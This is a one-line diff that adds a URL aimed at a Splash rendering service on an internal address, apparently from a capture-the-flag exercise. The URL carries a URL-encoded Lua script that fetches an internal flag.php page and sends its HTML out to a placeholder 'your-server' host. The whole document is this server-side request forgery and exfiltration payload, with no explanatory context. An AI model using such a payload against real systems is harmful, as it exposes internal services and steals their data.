@@ -1,0 +1,1 @@
+http://172.16.0.13:8050/execute?url=http://172.16.0.14/flag.php&lua_source=function%20main(splash,%20args)%0D%0A%20%20assert(splash:go(args.url))%0D%0A%20%20assert(splash:wait(0.5))%0D%0A%20%20splash:go("http://your-server/?"%20..%20splash:html())%0D%0A%20%20return%20%7B%0D%0A%20%20%7D%0D%0Aend
